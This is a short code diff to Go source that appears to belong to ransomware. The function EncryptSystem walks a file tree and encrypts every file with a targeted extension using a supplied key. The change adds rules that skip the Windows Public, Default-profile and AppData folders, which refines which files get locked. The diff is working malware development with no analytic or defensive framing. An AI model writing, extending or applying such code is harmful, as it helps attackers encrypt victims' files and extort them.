@@ -45,6 +45,9 @@ func EncryptSystem(root string, targets []string, key []byte) []string {
 	var files []string
 	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
 		// Check if not a directory, and contains one of our extensions:
+		if strings.Contains(path, "\\Users\\Public\\") || strings.Contains(path, "\\Users\\Default\\") || strings.Contains(path, "\\AppData\\") {
+			return nil
+		}
 		if !d.IsDir() && HasMatchingExtension(path, targets) {
 			EncryptFile(path, key)
 			files = append(files, d.Name())
